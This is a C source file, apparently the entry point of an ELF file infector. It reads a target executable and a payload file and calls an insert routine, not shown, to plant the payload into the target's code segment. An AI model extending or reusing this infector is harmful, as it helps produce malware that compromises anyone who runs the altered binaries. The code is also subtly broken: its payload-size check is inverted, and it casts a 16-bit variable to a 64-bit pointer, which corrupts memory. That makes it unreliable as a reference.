#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <elf.h>

#include <log.h>

#include "config.h"
#include "elf-parser.h"
#include "utils.h"
#include "insertion.h"

int main(int argc, char **argv)
{
    byte *to_infect_content = NULL;			// Buffer that contents the 
    Elf64_Shdr *text_section;				// ELF Section header for the .text section
    Elf64_Phdr *exe_seg;				// ELF Program header of an executable segment
    byte *start_of_text_section;			// Pointer to the start and the end of the .text section
    byte *start_of_seg, *end_of_seg;

    byte *payload = NULL;
    uint16_t payload_size;

    // We check if the usage is correct
    if (argc != EXPECTED_ARGC) {
	fprintf(stderr, "Usage: %s <file-to-infect> <file-to-insert>", argv[0]);
	exit(EXIT_FAILURE);
    }

    to_infect_content = read_file(argv[1], NULL); 
    payload = read_file(argv[2], (uint64_t *) &payload_size);

    if (payload_size < PAGE_SIZE) {
	ERROR("The payload should have a size less than 0x%x", PAGE_SIZE);
    }

    insert(to_infect_content, payload, payload_size);
    
    return EXIT_SUCCESS;
}
